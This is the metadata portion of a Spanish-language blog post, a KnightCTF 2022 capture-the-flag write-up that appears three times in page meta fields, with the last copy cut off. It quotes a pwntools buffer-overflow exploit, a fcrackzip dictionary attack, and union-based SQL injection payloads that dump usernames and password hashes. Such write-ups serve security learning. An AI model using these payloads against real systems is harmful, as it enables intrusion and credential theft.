<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>KnightCTF 2022</title>

  <link rel="shortcut icon" href="/assets/images/favicon.ico">
  <link rel="icon" href="/assets/iamges/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/assets/images/favicon.gif" type="image/gif">

  <link rel="stylesheet" href="/assets/css/main.css">
  
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>KnightCTF 2022 | Filthy Hacker</title>
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="KnightCTF 2022" />
<meta name="author" content="m4teo" />
<meta property="og:locale" content="es" />
<meta name="description" content="KnightCTF 2022, es el primer capture the flag organizado por Knight Squad, este es de tipo jeopardy, por lo que encontraremos distintas categorías. Reverse Engineering The Encoder Al extraer y ejecutar el binario, the_encoder.out, vamos a darnos cuenta que nos pregunta por una cadena de caracteres; si introducimos cualquier carácter, el binario nos devolverá un valor bastante similar a los que encontramos en el enunciado del reto. Por otra parte, podemos darnos cuenta que si introducimos caracteres consecutivos, el valor que nos devuelve también lo es, esto ya nos da una posible idea de por donde van los tiros. Podemos consultar una tabla de código ASCII, para saber en que orden van los caracteres, y así simplificar las cosas. KCTF{s1Mpl3_3Nc0D3r_1337} PWN What’s Your Name Al extraer y ejecutar el binario, whats_your_name, vamos a darnos cuenta que nos pregunta por un nombre; si introducimos cualquier cadena de caracteres, el binario nos devolverá un mensaje de bienvenida. Si introducimos una cadena de caracteres lo suficientemente larga, conseguiremos un Segmentation Fault, lo cual nos da la idea de un posible Buffer Overflow. Podemos empezar a depurar el binario con GEF, tal y como lo hicimos en la máquina Safe de Hack The Box, y nos daremos cuenta que el buffer tiene una longitud de 72 bytes. Ya con esto en mente, podemos analizar el binario con Ghidra, y nos daremos cuenta que dentro de la función main, después de hacer una serie de validaciones, se está efectuando una llamada al sistema para ejecutar un cat al archivo /home/hacker/flag.txt. De modo que teniendo control sobre el registro RIP, si apuntamos a la dirección de la llamada al sistema, omitiremos toda la validación y conseguiremos listar la flag; para ello, haremos un script en Python, bastante parecido al de la máquina Safe de Hack The Box. #!/usr/bin/python3 from pwn import * context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;] context.arch = &#39;amd64&#39; context.os = &#39;linux&#39; p = remote(&quot;198.211.115.81&quot;, 10001) flag = p64(0x4011d3) junk = (&quot;A&quot;*72).encode() p.sendline(junk + flag) p.interactive() KCTF{bAbY_bUfF3r_0v3Rf1Ow} OSINT Canada Server Este reto es bastante simple, solamente teníamos que hacer una pequeña búsqueda en internet. KCTF{192.99.167.83} Find The Camera Una vez descargamos el archivo adjunto, vamos a darnos cuenta que los derechos de autor le pertenecen a JenCh012, así que procedemos a buscarlo. Vemos que, aparte de algunas páginas rusas, nuestra búsqueda guarda relación con autobuses, por lo que estamos en el lugar correcto, entraremos en el primer resultado. Podemos observar que hay una sección en la que podemos introducir la matrícula del autobús, y posteriormente, nos arrojará un resultado. Ambas fotografías curiosamente pertenecen al usuario JenCh012, por lo que haremos clic en la fotografía que nos interesa. Ya con esto habríamos conseguido el modelo de la cámara, ahora solamente haría falta saber a que marca pertenece. KCTF{SONY_DSC_S&amp;980} Steganography Follow The White Rabbit Una vez descargado el archivo adjunto, podemos darnos cuenta que existe una serie de puntos y líneas, por lo que podemos intuir que estamos frente a código morse. Para decodificarlo, podemos usar herramientas como dcode. KCTF{L0OKB4Y0UL34P} Follow Cuando empezamos a analizar el archivo PDF adjunto, rápidamente nos daremos cuenta que existe un espacio en blanco demasiado grande. Por lo que si marcamos el espacio en blanco, nos daremos cuenta que hay algo ahí. De modo que copiaremos y pegaremos el texto en otro lado, revelando así la flag. KCTF{This_is_the_real_flag} QR Code From The Future Al abrir el archivo adjunto, nos daremos cuenta que estamos frente a una sucesión de códigos QR que cambia bastante rápido, por lo que, lo primero que haremos será identificar cada uno de los frames que componen este GIF, para ello podemos hacer uso de Ezgif. Una vez hemos conseguido los 48 códigos QR que componen el GIF, pasaremos a decodificar cada uno de ellos; para agilizar el proceso haremos uso de zbarimg, por lo que deberemos de tener descargados todos los códigos QR. En caso de no contar con la herramienta descargada podemos hacer lo siguiente: sudo apt install zbar-tools zbarimg * | cut -d &quot;:&quot; -f2 | tr -d &quot;\n&quot; Una vez escaneados los 48 código QR conseguiremos la siguiente cadena de caracteres: }pvznalq_bg_pvgngf_zbes_qriybir_gbt_rqbp_ED{SGPX Ligeramente podemos empezar a ver el formato de la flag, de modo que la cadena que acabamos de conseguir, está al revés. zbarimg * | cut -d &quot;:&quot; -f2 | tac | tr -d &quot;\n&quot; La cadena, está encriptada por ROT13, por lo que al decodificarla, conseguiremos la flag: KCTF{QR_code_got_evolved_from_static_to_dynamic} Misc Unzip Me Al descomprimir el archivo unzipme.tar.gz, extraeremos un archivo que lleva por nombre unzipme. El propio nombre del archivo nos sugiere que debemos de descomprimirlo, sin embargo, no conocemos en que formato está comprimido; podríamos hacer uso del comando file, pero nos dirá que simplemente se trata de data. Como no conocemos el formato del archivo, podríamos visualizar su contenido en hexadecimal haciendo uso de xxd, para así conseguir su magic number. xxd unzipme Si nos percatamos, cada pareja de dígitos está dada la vuelta; es decir, la forma correcta de los cuatro primeros dígitos debería ser 504B 0304, esto corresponde con el magic number de los archivos PKZip. Tenemos una lista completa de magic numbers, de varios tipos de archivos, aquí. De este modo, haciendo uso de CyberChef, podemos descomprimir el archivo unzipme. Lo primero que haremos será indicar que queremos trabajar con el formato hexdump, y posterior a ello introduciremos el output conseguido con el comando xxd. Luego de esto, indicaremos que queremos cambiar el endianness cada 2 bytes, para finalmente descomprimir el archivo unzipme y conseguir la flag. KCTF{sO_yOu_sWaPP3D_tHe_f1L3} Look Closely Para este reto se nos da un archivo .wav, del cual no logramos identificar nada. Lo que podemos hacer es visualizar el espectrograma con herramientas como Audacity. sudo apt install audacity https://drive.google.com/file/d/1_6c_waS9ijouTpqI_tUO6VCRf7fE6gCY/view?usp=sharing En el enlace encontraremos un video que aparte de verse fatal, contiene dos cadenas de caracteres escritas en binario. 01001011 01000011 01010100 01000110 01111011 01001000 00110011 01001100 01001100 01001111 01011111 01001010 00110011 01001100 01001100 01001111 01111101 Una vez las unimos, y traducimos obtenemos la flag. KCTF{H3LLO_J3LLO} Digital Forensics The Lost Flag A la hora de abrir el archivo adjunto no vamos a encontrar nada sospechoso a primera vista. No obstante, si utilizamos herramientas como StegSolve o Forensically, vamos a poder visualizar la flag. wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar chmod +x stegsolve.jar KCTF{Y0U_F0UND_M3} Unknown File Al descomprimir el archivo adjunto, extraeremos un archivo que lleva por nombre unknown file. Así como el enunciado sugiere, no se sabe ante que tipo de archivo nos estamos enfrentando, por lo que comandos como file, no nos serán de utilidad. Lo que podemos hacer es visualizar el contenido del archivo en hexadecimal haciendo uso de xxd, para así conseguir su magic number. xxd unknown\ file | head Si nos percatamos, el magic number no corresponde con ninguno conocido, sin embargo, podemos observar una sección que dice IHDR, el cual corresponde con uno de los chunks principales de cualquier imagen PNG. De modo que reemplazando los cuatro primeros dígitos con 89 50 4E 47, conseguiremos visualizar la flag; esto podemos hacerlo mediante herramientas online como Online Hex Editor, o ghex, que para instalarlo es bastante sencillo: sudo apt install ghex KCTF{Imag3_H3ad3r_M4nipul4t10N} Let’s Walk Together Al abrir el archivo adjunto no vamos a observar nada relevante, no obstante, el nombre del reto nos da una pista bastante importante. Vamos a hacer uso de binwalk, una herramienta de ingeniería inversa dedicada a identificar archivos y código malicioso en imágenes de firmware. binwalk -e interesting_waves.png Se nos creará una carpeta dentro de la cual estará todo lo que se encontraba dentro de la imagen; entre ello, un archivo .zip protegido por contraseña. En vista de que no tenemos ningún indicio de ninguna contraseña, aplicaremos fuerza bruta sobre el archivo .zip mediante fcrackzip. sudo apt install fcrackzip Para ello necesitaremos de algún diccionario, el más común es rockyou.txt. fcrackzip -D -p /ruta/del/diccionario/rockyou.txt -u 11150.zip -D - Indicamos que queremos hacer un ataque de diccionario -p - Indicamos el diccionario -u - Nos quedamos solamente con la contraseña correcta; descartamos falsos positivos Ya con la contraseña del .zip, podemos extraer el archivo flag.txt. KCTF{BiNw4lk_is_h3lpfUl} Networking Compromised CTF Platform Se nos da una captura de tráfico que bien podemos analizar con TShark o Wireshark. En este caso, como se nos pide averiguar por un nombre de usuario y contraseña, lo más sensato sería filtrar la captura por peticiones de tipo POST. http.request.method == POST Si empezamos a revisar cada petición, veremos que el atacante probó credenciales típicas como admin/admin, admin/admin123, test/test, admin/password devolviendo siempre el servidor un mensaje Invalid Username or Password, hasta que da con las credenciales correctas, demo/demo. KCTF{demo_demo} Robots.txt Como estamos en búsqueda del archivo robots.txt, podemos filtrar la captura de tráfico por peticiones de tipo GET, y posteriormente por todas aquellas que mencionen el archivo que buscamos, esto último lo podemos hacer con CTRL + F. http.request.method == GET KCTF{/includes/users.php} PHP Version Este reto era bastante sencillo, podíamos completarlo a medida que realizábamos otros retos. La versión de PHP podemos visualizarla en cualquier petición que se realice al servidor. KCTF{PHP/7.4.27} KCTF Para este reto no se nos da mayor contexto, sin embargo, si analizamos los objetos HTTP encontraremos una imagen que contiene la flag. KCTF{Ev3rY_USEr_1nPuT_SH0uLD_B3_S4niT1z3D} Admin Arena Nuevamente tenemos que filtrar de la captura de tráfico, información que viaja por POST, en este caso, en la ruta Admin Arena. http.request.method == POST KCTF{tareq@hackerzarena.com_P@$$w0Rd} Vuln A partir de este punto, los retos van enfocados al ataque que se realizó en contra de la plataforma de CTF. Si hemos estado atentos a las diversas peticiones HTTP que se realizaron, nos habremos percatado que hay varias bastante sospechosas. Ya viendo esto podríamos determinar el tipo de ataque que se realizó, SQL Injection, no obstante, al verse url encodeado, puede resultar un poco complicado leer la petición. KCTF{sql_injection} Vuln Columns Para visualizar de mejor manera las inyecciones SQL que se realizaron, podemos exportar los objetos HTTP. Si observamos detenidamente, nos daremos cuenta que el atacante empieza a ordenar las columnas de la base de datos de manera consecutiva, con el objetivo de conocer el total de columnas existentes. Este proceso lo realiza un total de diez veces, en el primer intento hay un pequeño fallo de sintaxis por lo que lo descartamos, y a partir del segundo intento, empieza a ordenar las columnas, una a una, esto lo hace hasta la columna nueve, la cual no existe, razón por la cual, en el décimo intento, vuelve a ordenar las columnas hasta la número ocho. users.php?id=1&#39; order by 1,2,3,4,5,6,7,8 --+ Sabidas el número total de columnas de la base de datos, el atacante empieza a determinar cuales son vulnerables, esto lo hace a través del comando union, con el cual empieza a reemplazar ciertas columnas por otra serie de comandos que le otorgan información relevante de la base de datos. users.php?id=1&#39; union select 1,2,3,4,5,6,7,8 --+ users.php?id=1&#39; union select 1,2,version(),4,5,6,7,8 --+ Una vez analizadas las columnas que el atacante utiliza, podemos determinar que son cuatro, las columnas vulnerables; concretamente, las columnas 3, 6, 7 y 8. KCTF{4} Hashed Password Para este reto se nos pregunta por el hash de la contraseña del usuario tareq, la cual el atacante consiguió haciendo uso de las inyecciones SQL, concretamente: users.php?id=1&#39; union select 1,2,3,group_concat(username,0x203a20,password),5,user(),7,8 from users --+ KCTF{$2Y$10$XVKEZO/NKM4KE073CPTEG.VKFTHMH1CCDPRDD5JWYWKFEZ6GZKZN.} Database Flag Al igual que el reto anterior, se pude asumir que el atacante a través de las inyecciones SQL, logró filtrar información relevante de la plataforma de CTF, en este caso una flag; la inyección en cuestión es: users.php?id=1&#39; union select 1,2,3,4,5,6,group_concat(flag),8 from vulnerable --+ Conseguimos filtrar dos cadenas encriptadas en Base64. S0NURntTcUw= XzFOajNDN2kwbn0= Al desencriptarlas conseguiremos la flag. KCTF{SqL_1Nj3C7i0n} Attacker Finalmente, parece ser que el atacante decidió ‘firmar’ el ataque, dejando su nombre en la última inyección SQL, donde deja un mensaje encriptado en hexadecimal. users.php?id=1&#39; union select 1,2,0x4861636b6564204279204d4f5348,4,5,6,group_concat(flag),8 from vulnerable --+ No obstante, si no queremos desencriptar el mensaje, podemos verlo en texto plano desde el propio Wireshark." />
<meta property="og:description" content="KnightCTF 2022, es el primer capture the flag organizado por Knight Squad, este es de tipo jeopardy, por lo que encontraremos distintas categorías. Reverse Engineering The Encoder Al extraer y ejecutar el binario, the_encoder.out, vamos a darnos cuenta que nos pregunta por una cadena de caracteres; si introducimos cualquier carácter, el binario nos devolverá un valor bastante similar a los que encontramos en el enunciado del reto. Por otra parte, podemos darnos cuenta que si introducimos caracteres consecutivos, el valor que nos devuelve también lo es, esto ya nos da una posible idea de por donde van los tiros. Podemos consultar una tabla de código ASCII, para saber en que orden van los caracteres, y así simplificar las cosas. KCTF{s1Mpl3_3Nc0D3r_1337} PWN What’s Your Name Al extraer y ejecutar el binario, whats_your_name, vamos a darnos cuenta que nos pregunta por un nombre; si introducimos cualquier cadena de caracteres, el binario nos devolverá un mensaje de bienvenida. Si introducimos una cadena de caracteres lo suficientemente larga, conseguiremos un Segmentation Fault, lo cual nos da la idea de un posible Buffer Overflow. Podemos empezar a depurar el binario con GEF, tal y como lo hicimos en la máquina Safe de Hack The Box, y nos daremos cuenta que el buffer tiene una longitud de 72 bytes. Ya con esto en mente, podemos analizar el binario con Ghidra, y nos daremos cuenta que dentro de la función main, después de hacer una serie de validaciones, se está efectuando una llamada al sistema para ejecutar un cat al archivo /home/hacker/flag.txt. De modo que teniendo control sobre el registro RIP, si apuntamos a la dirección de la llamada al sistema, omitiremos toda la validación y conseguiremos listar la flag; para ello, haremos un script en Python, bastante parecido al de la máquina Safe de Hack The Box. #!/usr/bin/python3 from pwn import * context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;] context.arch = &#39;amd64&#39; context.os = &#39;linux&#39; p = remote(&quot;198.211.115.81&quot;, 10001) flag = p64(0x4011d3) junk = (&quot;A&quot;*72).encode() p.sendline(junk + flag) p.interactive() KCTF{bAbY_bUfF3r_0v3Rf1Ow} OSINT Canada Server Este reto es bastante simple, solamente teníamos que hacer una pequeña búsqueda en internet. KCTF{192.99.167.83} Find The Camera Una vez descargamos el archivo adjunto, vamos a darnos cuenta que los derechos de autor le pertenecen a JenCh012, así que procedemos a buscarlo. Vemos que, aparte de algunas páginas rusas, nuestra búsqueda guarda relación con autobuses, por lo que estamos en el lugar correcto, entraremos en el primer resultado. Podemos observar que hay una sección en la que podemos introducir la matrícula del autobús, y posteriormente, nos arrojará un resultado. Ambas fotografías curiosamente pertenecen al usuario JenCh012, por lo que haremos clic en la fotografía que nos interesa. Ya con esto habríamos conseguido el modelo de la cámara, ahora solamente haría falta saber a que marca pertenece. KCTF{SONY_DSC_S&amp;980} Steganography Follow The White Rabbit Una vez descargado el archivo adjunto, podemos darnos cuenta que existe una serie de puntos y líneas, por lo que podemos intuir que estamos frente a código morse. Para decodificarlo, podemos usar herramientas como dcode. KCTF{L0OKB4Y0UL34P} Follow Cuando empezamos a analizar el archivo PDF adjunto, rápidamente nos daremos cuenta que existe un espacio en blanco demasiado grande. Por lo que si marcamos el espacio en blanco, nos daremos cuenta que hay algo ahí. De modo que copiaremos y pegaremos el texto en otro lado, revelando así la flag. KCTF{This_is_the_real_flag} QR Code From The Future Al abrir el archivo adjunto, nos daremos cuenta que estamos frente a una sucesión de códigos QR que cambia bastante rápido, por lo que, lo primero que haremos será identificar cada uno de los frames que componen este GIF, para ello podemos hacer uso de Ezgif. Una vez hemos conseguido los 48 códigos QR que componen el GIF, pasaremos a decodificar cada uno de ellos; para agilizar el proceso haremos uso de zbarimg, por lo que deberemos de tener descargados todos los códigos QR. En caso de no contar con la herramienta descargada podemos hacer lo siguiente: sudo apt install zbar-tools zbarimg * | cut -d &quot;:&quot; -f2 | tr -d &quot;\n&quot; Una vez escaneados los 48 código QR conseguiremos la siguiente cadena de caracteres: }pvznalq_bg_pvgngf_zbes_qriybir_gbt_rqbp_ED{SGPX Ligeramente podemos empezar a ver el formato de la flag, de modo que la cadena que acabamos de conseguir, está al revés. zbarimg * | cut -d &quot;:&quot; -f2 | tac | tr -d &quot;\n&quot; La cadena, está encriptada por ROT13, por lo que al decodificarla, conseguiremos la flag: KCTF{QR_code_got_evolved_from_static_to_dynamic} Misc Unzip Me Al descomprimir el archivo unzipme.tar.gz, extraeremos un archivo que lleva por nombre unzipme. El propio nombre del archivo nos sugiere que debemos de descomprimirlo, sin embargo, no conocemos en que formato está comprimido; podríamos hacer uso del comando file, pero nos dirá que simplemente se trata de data. Como no conocemos el formato del archivo, podríamos visualizar su contenido en hexadecimal haciendo uso de xxd, para así conseguir su magic number. xxd unzipme Si nos percatamos, cada pareja de dígitos está dada la vuelta; es decir, la forma correcta de los cuatro primeros dígitos debería ser 504B 0304, esto corresponde con el magic number de los archivos PKZip. Tenemos una lista completa de magic numbers, de varios tipos de archivos, aquí. De este modo, haciendo uso de CyberChef, podemos descomprimir el archivo unzipme. Lo primero que haremos será indicar que queremos trabajar con el formato hexdump, y posterior a ello introduciremos el output conseguido con el comando xxd. Luego de esto, indicaremos que queremos cambiar el endianness cada 2 bytes, para finalmente descomprimir el archivo unzipme y conseguir la flag. KCTF{sO_yOu_sWaPP3D_tHe_f1L3} Look Closely Para este reto se nos da un archivo .wav, del cual no logramos identificar nada. Lo que podemos hacer es visualizar el espectrograma con herramientas como Audacity. sudo apt install audacity https://drive.google.com/file/d/1_6c_waS9ijouTpqI_tUO6VCRf7fE6gCY/view?usp=sharing En el enlace encontraremos un video que aparte de verse fatal, contiene dos cadenas de caracteres escritas en binario. 01001011 01000011 01010100 01000110 01111011 01001000 00110011 01001100 01001100 01001111 01011111 01001010 00110011 01001100 01001100 01001111 01111101 Una vez las unimos, y traducimos obtenemos la flag. KCTF{H3LLO_J3LLO} Digital Forensics The Lost Flag A la hora de abrir el archivo adjunto no vamos a encontrar nada sospechoso a primera vista. No obstante, si utilizamos herramientas como StegSolve o Forensically, vamos a poder visualizar la flag. wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar chmod +x stegsolve.jar KCTF{Y0U_F0UND_M3} Unknown File Al descomprimir el archivo adjunto, extraeremos un archivo que lleva por nombre unknown file. Así como el enunciado sugiere, no se sabe ante que tipo de archivo nos estamos enfrentando, por lo que comandos como file, no nos serán de utilidad. Lo que podemos hacer es visualizar el contenido del archivo en hexadecimal haciendo uso de xxd, para así conseguir su magic number. xxd unknown\ file | head Si nos percatamos, el magic number no corresponde con ninguno conocido, sin embargo, podemos observar una sección que dice IHDR, el cual corresponde con uno de los chunks principales de cualquier imagen PNG. De modo que reemplazando los cuatro primeros dígitos con 89 50 4E 47, conseguiremos visualizar la flag; esto podemos hacerlo mediante herramientas online como Online Hex Editor, o ghex, que para instalarlo es bastante sencillo: sudo apt install ghex KCTF{Imag3_H3ad3r_M4nipul4t10N} Let’s Walk Together Al abrir el archivo adjunto no vamos a observar nada relevante, no obstante, el nombre del reto nos da una pista bastante importante. Vamos a hacer uso de binwalk, una herramienta de ingeniería inversa dedicada a identificar archivos y código malicioso en imágenes de firmware. binwalk -e interesting_waves.png Se nos creará una carpeta dentro de la cual estará todo lo que se encontraba dentro de la imagen; entre ello, un archivo .zip protegido por contraseña. En vista de que no tenemos ningún indicio de ninguna contraseña, aplicaremos fuerza bruta sobre el archivo .zip mediante fcrackzip. sudo apt install fcrackzip Para ello necesitaremos de algún diccionario, el más común es rockyou.txt. fcrackzip -D -p /ruta/del/diccionario/rockyou.txt -u 11150.zip -D - Indicamos que queremos hacer un ataque de diccionario -p - Indicamos el diccionario -u - Nos quedamos solamente con la contraseña correcta; descartamos falsos positivos Ya con la contraseña del .zip, podemos extraer el archivo flag.txt. KCTF{BiNw4lk_is_h3lpfUl} Networking Compromised CTF Platform Se nos da una captura de tráfico que bien podemos analizar con TShark o Wireshark. En este caso, como se nos pide averiguar por un nombre de usuario y contraseña, lo más sensato sería filtrar la captura por peticiones de tipo POST. http.request.method == POST Si empezamos a revisar cada petición, veremos que el atacante probó credenciales típicas como admin/admin, admin/admin123, test/test, admin/password devolviendo siempre el servidor un mensaje Invalid Username or Password, hasta que da con las credenciales correctas, demo/demo. KCTF{demo_demo} Robots.txt Como estamos en búsqueda del archivo robots.txt, podemos filtrar la captura de tráfico por peticiones de tipo GET, y posteriormente por todas aquellas que mencionen el archivo que buscamos, esto último lo podemos hacer con CTRL + F. http.request.method == GET KCTF{/includes/users.php} PHP Version Este reto era bastante sencillo, podíamos completarlo a medida que realizábamos otros retos. La versión de PHP podemos visualizarla en cualquier petición que se realice al servidor. KCTF{PHP/7.4.27} KCTF Para este reto no se nos da mayor contexto, sin embargo, si analizamos los objetos HTTP encontraremos una imagen que contiene la flag. KCTF{Ev3rY_USEr_1nPuT_SH0uLD_B3_S4niT1z3D} Admin Arena Nuevamente tenemos que filtrar de la captura de tráfico, información que viaja por POST, en este caso, en la ruta Admin Arena. http.request.method == POST KCTF{tareq@hackerzarena.com_P@$$w0Rd} Vuln A partir de este punto, los retos van enfocados al ataque que se realizó en contra de la plataforma de CTF. Si hemos estado atentos a las diversas peticiones HTTP que se realizaron, nos habremos percatado que hay varias bastante sospechosas. Ya viendo esto podríamos determinar el tipo de ataque que se realizó, SQL Injection, no obstante, al verse url encodeado, puede resultar un poco complicado leer la petición. KCTF{sql_injection} Vuln Columns Para visualizar de mejor manera las inyecciones SQL que se realizaron, podemos exportar los objetos HTTP. Si observamos detenidamente, nos daremos cuenta que el atacante empieza a ordenar las columnas de la base de datos de manera consecutiva, con el objetivo de conocer el total de columnas existentes. Este proceso lo realiza un total de diez veces, en el primer intento hay un pequeño fallo de sintaxis por lo que lo descartamos, y a partir del segundo intento, empieza a ordenar las columnas, una a una, esto lo hace hasta la columna nueve, la cual no existe, razón por la cual, en el décimo intento, vuelve a ordenar las columnas hasta la número ocho. users.php?id=1&#39; order by 1,2,3,4,5,6,7,8 --+ Sabidas el número total de columnas de la base de datos, el atacante empieza a determinar cuales son vulnerables, esto lo hace a través del comando union, con el cual empieza a reemplazar ciertas columnas por otra serie de comandos que le otorgan información relevante de la base de datos. users.php?id=1&#39; union select 1,2,3,4,5,6,7,8 --+ users.php?id=1&#39; union select 1,2,version(),4,5,6,7,8 --+ Una vez analizadas las columnas que el atacante utiliza, podemos determinar que son cuatro, las columnas vulnerables; concretamente, las columnas 3, 6, 7 y 8. KCTF{4} Hashed Password Para este reto se nos pregunta por el hash de la contraseña del usuario tareq, la cual el atacante consiguió haciendo uso de las inyecciones SQL, concretamente: users.php?id=1&#39; union select 1,2,3,group_concat(username,0x203a20,password),5,user(),7,8 from users --+ KCTF{$2Y$10$XVKEZO/NKM4KE073CPTEG.VKFTHMH1CCDPRDD5JWYWKFEZ6GZKZN.} Database Flag Al igual que el reto anterior, se pude asumir que el atacante a través de las inyecciones SQL, logró filtrar información relevante de la plataforma de CTF, en este caso una flag; la inyección en cuestión es: users.php?id=1&#39; union select 1,2,3,4,5,6,group_concat(flag),8 from vulnerable --+ Conseguimos filtrar dos cadenas encriptadas en Base64. S0NURntTcUw= XzFOajNDN2kwbn0= Al desencriptarlas conseguiremos la flag. KCTF{SqL_1Nj3C7i0n} Attacker Finalmente, parece ser que el atacante decidió ‘firmar’ el ataque, dejando su nombre en la última inyección SQL, donde deja un mensaje encriptado en hexadecimal. users.php?id=1&#39; union select 1,2,0x4861636b6564204279204d4f5348,4,5,6,group_concat(flag),8 from vulnerable --+ No obstante, si no queremos desencriptar el mensaje, podemos verlo en texto plano desde el propio Wireshark." />
<meta property="og:site_name" content="Filthy Hacker" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-01-17T00:00:00-05:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="KnightCTF 2022" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"m4teo","url":"https://mateonitro550.github.io"},"dateModified":"2022-01-17T00:00:00-05:00","datePublished":"2022-01-17T00:00:00-05:00","description":"KnightCTF 2022, es el primer capture the flag organizado por Knight Squad, este es de tipo jeopardy, por lo que encontraremos distintas categorías. Reverse Engineering The Encoder Al extraer y ejecutar el binario, the_encoder.out, vamos a darnos cuenta que nos pregunta por una cadena de caracteres; si introducimos cualquier carácter, el binario nos devolverá un valor bastante similar a los que encontramos en el enunciado del reto. Por otra parte, podemos darnos cuenta que si introducimos caracteres consecutivos, el valor que nos devuelve también lo es, esto ya nos da una posible idea de por donde van los tiros. Podemos consultar una tabla de código ASCII, para saber en que orden van los caracteres, y así simplificar las cosas. KCTF{s1Mpl3_3Nc0D3r_1337} PWN What’s Your Name Al extraer y ejecutar el binario, whats_your_name, vamos a darnos cuenta que nos pregunta por un nombre; si introducimos cualquier cadena de caracteres, el binario nos devolverá un mensaje de bienvenida. Si introducimos una cadena de caracteres lo suficientemente larga, conseguiremos un Segmentation Fault, lo cual nos da la idea de un posible Buffer Overflow. Podemos empezar a depurar el binario con GEF, tal y como lo hicimos en la máquina Safe de Hack The Box, y nos daremos cuenta que el buffer tiene una longitud de 72 bytes. Ya con esto en mente, podemos analizar el binario con Ghidra, y nos daremos cuenta que dentro de la función main, después de hacer una serie de validaciones, se está efectuando una llamada al sistema para ejecutar un cat al archivo /home/hacker/flag.txt. De modo que teniendo control sobre el registro RIP, si apuntamos a la dirección de la llamada al sistema, omitiremos toda la validación y conseguiremos listar la flag; para ello, haremos un script en Python, bastante parecido al de la máquina Safe de Hack The Box. #!/usr/bin/python3 from pwn import * context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;] context.arch = &#39;amd64&#39; context.os = &#39;linux&#39; p = remote(&quot;198.211.115.81&quot;, 10001) flag = p64(0x4011d3) junk = (&quot;A&quot;*72).encode() p.sendline(junk + flag) p.interactive() KCTF{bAbY_bUfF3r_0v3Rf1Ow} OSINT Canada Server Este reto es bastante simple, solamente teníamos que hacer una pequeña búsqueda en internet. KCTF{192.99.167.83} Find The Camera Una vez descargamos el archivo adjunto, vamos a darnos cuenta que los derechos de autor le pertenecen a JenCh012, así que procedemos a buscarlo. Vemos que, aparte de algunas páginas rusas, nuestra búsqueda guarda relación con autobuses, por lo que estamos en el lugar correcto, entraremos en el primer resultado. Podemos observar que hay una sección en la que podemos introducir la matrícula del autobús, y posteriormente, nos arrojará un resultado. Ambas fotografías curiosamente pertenecen al usuario JenCh012, por lo que haremos clic en la fotografía que nos interesa. Ya con esto habríamos conseguido el modelo de la cámara, ahora solamente haría falta saber a que marca pertenece. KCTF{SONY_DSC_S&amp;980} Steganography Follow The White Rabbit Una vez descargado el archivo adjunto, podemos darnos cuenta que existe una serie de puntos y líneas, por lo que podemos intuir que estamos frente a código morse. Para decodificarlo, podemos usar herramientas como dcode. KCTF{L0OKB4Y0UL34P} Follow Cuando empezamos a analizar el archivo PDF adjunto, rápidamente nos daremos cuenta que existe un espacio en blanco demasiado grande. Por lo que si marcamos el espacio en blanco, nos daremos cuenta que hay algo ahí. De modo que copiaremos y pegaremos el texto en otro lado, revelando así la flag. KCTF{This_is_the_real_flag} QR Code From The Future Al abrir el archivo adjunto, nos daremos cuenta que estamos frente a una sucesión de códigos QR que cambia bastante rápido, por lo que, lo primero que haremos será identificar cada uno de los frames que componen este GIF, para ello podemos hacer uso de Ezgif. Una vez hemos conseguido los 48 códigos QR que componen el GIF, pasaremos a decodificar cada uno de ellos; para agilizar el proceso haremos uso de zbarimg, por lo que deberemos de tener descargados todos los códigos QR. En caso de no contar con la herramienta descargada podemos hacer lo siguiente: sudo apt install zbar-tools zbarimg * | cut -d &quot;:&quot; -f2 | tr -d &quot;\\n&quot; Una vez escaneados los 48 código QR conseguiremos la siguiente cadena de caracteres: }pvznalq_bg_pvgngf_zbes_qriybir_gbt_rqbp_ED{SGPX Ligeramente podemos empezar a ver el formato de la flag, de modo que la cadena que acabamos de conseguir, está al revés. zbarimg * | cut -d &quot;:&quot; -f2 | tac | tr -d &quot;\\n&quot; La cadena, está encriptada por ROT13, por lo que al decodificarla, conseguiremos la flag: KCTF{QR_code_got_evolved_from_static_to_dynamic} Misc Unzip Me Al descomprimir el archivo unzipme.tar.gz, extraeremos un archivo que lleva por nombre unzipme. El propio nombre del archivo nos sugiere que debemos de descomprimirlo, sin embargo, no conocemos en que formato está comprimido; podríamos hacer uso del comando file, pero nos dirá que simplemente se trata de data. Como no conocemos el formato del archivo, podríamos visualizar su contenido en hexadecimal haciendo uso de xxd, para así conseguir su magic number. xxd unzipme Si nos percatamos, cada pareja de dígitos está dada la vuelta; es decir, la forma correcta de los cuatro primeros dígitos debería ser 504B 0304, esto corresponde con el magic number de los archivos PKZip. Tenemos una lista completa de magic numbers, de varios tipos de archivos, aquí. De este modo, haciendo uso de CyberChef, podemos descomprimir el archivo unzipme. Lo primero que haremos será indicar que queremos trabajar con el formato hexdump, y posterior a ello introduciremos el output conseguido con el comando xxd. Luego de esto, indicaremos que queremos cambiar el endianness cada 2 bytes, para finalmente descomprimir el archivo unzipme y conseguir la flag. KCTF{sO_yOu_sWaPP3D_tHe_f1L3} Look Closely Para este reto se nos da un archivo .wav, del cual no logramos identificar nada. Lo que podemos hacer es visualizar el espectrograma con herramientas como Audacity. sudo apt install audacity https://drive.google.com/file/d/1_6c_waS9ijouTpqI_tUO6VCRf7fE6gCY/view?usp=sharing En el enlace encontraremos un video que aparte de verse fatal, contiene dos cadenas de caracteres escritas en binario. 01001011 01000011 01010100 01000110 01111011 01001000 00110011 01001100 01001100 01001111 01011111 01001010 00110011 01001100 01001100 01001111 01111101 Una vez las unimos, y traducimos obtenemos la flag. KCTF{H3LLO_J3LLO} Digital Forensics The Lost Flag A la hora de abrir el archivo adjunto no vamos a encontrar nada sospechoso a primera vista. No obstante, si 